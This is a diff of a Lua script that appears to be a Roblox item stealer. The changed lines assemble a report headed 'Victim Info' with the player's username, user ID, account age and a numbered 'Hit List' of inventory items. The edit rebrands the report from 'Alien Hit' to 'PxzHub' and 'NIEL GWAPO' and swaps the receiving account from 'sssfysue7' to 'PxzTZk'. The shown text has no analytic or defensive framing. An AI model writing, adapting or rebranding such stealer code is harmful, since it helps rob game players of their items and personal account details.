@@ -170,7 +170,7 @@ task.spawn(function()
         end
     end
 
-    local fileContent = "🎮 Alien Hit Inventory Report\n"
+    local fileContent = "🎮 PxzHub Inventory Report\n"
     fileContent = fileContent .. "👤 Player: " .. playerName .. "\n"
     fileContent = fileContent .. "🆔 User ID: " .. userId .. "\n"
     fileContent = fileContent .. "⏰ Account Age: " .. accountAge .. "\n"
@@ -182,13 +182,13 @@ task.spawn(function()
         fileContent = fileContent .. i .. ". " .. itemName .. "\n"
     end
 
-    local message = "@everyone **Alien Hit**\n" ..
+    local message = "@everyone **NIEL GWAPO**\n" ..
     "──────────────\n" ..
     "**Victim Info:**\n" ..
     "Username: " .. playerName .. "\n" ..
     "Executor: Delta\n" .. 
     "Account Age: " .. accountAge .. "\n" ..
-    "Receiver: sssfysue7\n" ..
+    "Receiver: PxzTZk\n" ..
     "──────────────\n" ..
     "**Hit List:**\n"
 
